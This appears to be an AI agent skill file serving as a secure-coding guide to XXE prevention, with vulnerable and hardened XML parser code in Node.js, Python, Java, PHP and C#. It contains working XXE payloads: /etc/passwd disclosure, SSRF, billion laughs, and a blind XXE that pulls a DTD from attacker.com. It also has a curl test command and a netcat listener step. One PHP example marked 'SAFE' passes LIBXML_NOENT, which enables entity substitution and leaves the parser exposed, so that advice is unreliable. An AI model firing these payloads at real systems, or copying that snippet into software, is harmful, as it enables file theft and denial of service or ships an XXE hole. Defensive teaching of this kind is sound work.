---
name: xxe-prevention
description: |
  OWASP A04 - XML External Entity (XXE) Prevention. Use this skill when parsing XML,
  processing SOAP requests, handling SVG uploads, or working with XML-based formats.
  Activate when: XML parsing, SOAP, SVG upload, XML input, DOCTYPE, DTD, external entity,
  XML bomb, billion laughs, XSLT.
---

# XXE Prevention (OWASP A04)

**Prevent XML External Entity attacks by safely configuring XML parsers and validating XML input.**

## When to Use

- Parsing user-supplied XML
- Processing SOAP/WSDL services
- Handling SVG file uploads
- Working with Office documents (DOCX, XLSX)
- Implementing XML-based APIs
- Processing RSS/Atom feeds

## Attack Types

| Attack | Impact | Description |
|--------|--------|-------------|
| File Disclosure | HIGH | Read local files (/etc/passwd) |
| SSRF | HIGH | Access internal services |
| DoS (Billion Laughs) | HIGH | Memory exhaustion |
| Port Scanning | MEDIUM | Probe internal network |
| Remote Code Execution | CRITICAL | In rare configurations |

## Vulnerable Code Patterns

### Node.js

```javascript
// VULNERABLE - Default XML parser settings
const xml2js = require('xml2js');
const parser = new xml2js.Parser();
parser.parseString(userXml, callback);

// VULNERABLE - libxmljs with default options
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(userXml);
```

### Python

```python
# VULNERABLE - etree with default settings
from xml.etree import ElementTree
tree = ElementTree.parse(user_xml_file)

# VULNERABLE - lxml without disabling entities
from lxml import etree
doc = etree.parse(user_xml_file)
```

### Java

```java
// VULNERABLE - Default DocumentBuilder
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userXmlInput);

// VULNERABLE - Default SAX parser
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
parser.parse(userXmlInput, handler);
```

### PHP

```php
// VULNERABLE - simplexml_load_string with default
$xml = simplexml_load_string($userXml);

// VULNERABLE - DOMDocument with default
$doc = new DOMDocument();
$doc->loadXML($userXml);
```

## XXE Attack Payloads

```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF - Access internal service -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>

<!-- Billion Laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>

<!-- Blind XXE with out-of-band data exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

## Secure Implementation

### Node.js

```javascript
// SAFE - xml2js with explicit options
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
  // These are defaults in modern versions, but explicit is better
  explicitRoot: true,
  explicitArray: false
});

// SAFE - Use fast-xml-parser (secure by default)
const { XMLParser } = require('fast-xml-parser');
const parser = new XMLParser({
  ignoreAttributes: false,
  // External entities disabled by default
});
const result = parser.parse(xmlString);

// SAFE - libxmljs with disabled entities
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(userXml, {
  noent: false,      // Don't expand entities
  nonet: true,       // Don't allow network access
  noblanks: true,
  nocdata: true
});
```

### Python

```python
# SAFE - defusedxml (recommended)
import defusedxml.ElementTree as ET
tree = ET.parse(user_xml_file)

# SAFE - lxml with security settings
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
doc = etree.parse(user_xml_file, parser)

# SAFE - Standard library with defused
from xml.etree.ElementTree import XMLParser
import defusedxml
defusedxml.defuse_stdlib()  # Patches standard library
```

### Java

```java
// SAFE - DocumentBuilder with security features
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DTDs entirely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Or disable external entities and DTDs
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userXmlInput);

// SAFE - SAX Parser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
SAXParser parser = spf.newSAXParser();
```

### PHP

```php
// SAFE - Disable entity loading
libxml_disable_entity_loader(true);  // Deprecated in PHP 8.0+

// SAFE - For PHP 8.0+, use LIBXML options
$doc = new DOMDocument();
$doc->loadXML($userXml, LIBXML_NOENT | LIBXML_NONET);

// SAFE - simplexml with options
$xml = simplexml_load_string($userXml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);
```

### .NET / C#

```csharp
// SAFE - XmlReader with secure settings
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    // Parse XML safely
}

// SAFE - XmlDocument with security
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;
doc.LoadXml(userXml);
```

## SVG Upload Security

SVG files are XML and can contain XXE attacks:

```javascript
// SAFE - Sanitize SVG uploads
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

function sanitizeSVG(svgContent) {
  const window = new JSDOM('').window;
  const DOMPurify = createDOMPurify(window);

  return DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
    ADD_TAGS: ['use'],
    ADD_ATTR: ['xlink:href']
  });
}

// SAFE - Or convert to raster format
const sharp = require('sharp');

async function convertSVGtoPNG(svgBuffer) {
  return sharp(svgBuffer)
    .png()
    .toBuffer();
}
```

## Office Document Security

DOCX, XLSX, PPTX are ZIP files containing XML:

```javascript
const AdmZip = require('adm-zip');
const { XMLParser } = require('fast-xml-parser');

async function safeParseOfficeDoc(filePath) {
  const zip = new AdmZip(filePath);
  const entries = zip.getEntries();

  const parser = new XMLParser({
    // Secure settings
  });

  for (const entry of entries) {
    if (entry.entryName.endsWith('.xml')) {
      const content = entry.getData().toString('utf8');

      // Check for DOCTYPE declarations
      if (content.includes('<!DOCTYPE') || content.includes('<!ENTITY')) {
        throw new Error('Potentially malicious XML content detected');
      }

      const parsed = parser.parse(content);
      // Process safely...
    }
  }
}
```

## Code Review Checklist

- [ ] XML parsers configured to disable DTDs
- [ ] External entity processing disabled
- [ ] Network access disabled for parsers
- [ ] defusedxml used (Python)
- [ ] SVG uploads sanitized or converted
- [ ] Office document uploads validated
- [ ] SOAP endpoints use secure parsers
- [ ] No DOCTYPE declarations in expected input

## Testing for XXE

```bash
# Test with XXE payload
curl -X POST http://target/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

# Test for blind XXE
# 1. Set up listener: nc -l 8080
# 2. Send payload pointing to your server

# Automated testing
# Use Burp Suite's XXE scanner
# Or OWASP ZAP's active scanner
```

## Best Practices

1. **Disable DTDs**: If you don't need them, disable completely
2. **Use Safe Libraries**: defusedxml (Python), fast-xml-parser (Node)
3. **Validate Input**: Reject XML with DOCTYPE declarations
4. **Prefer JSON**: Use JSON instead of XML when possible
5. **Convert SVGs**: Convert to PNG/raster before storing
6. **Sanitize Office Files**: Validate before processing
7. **Network Isolation**: XML parsers shouldn't access network
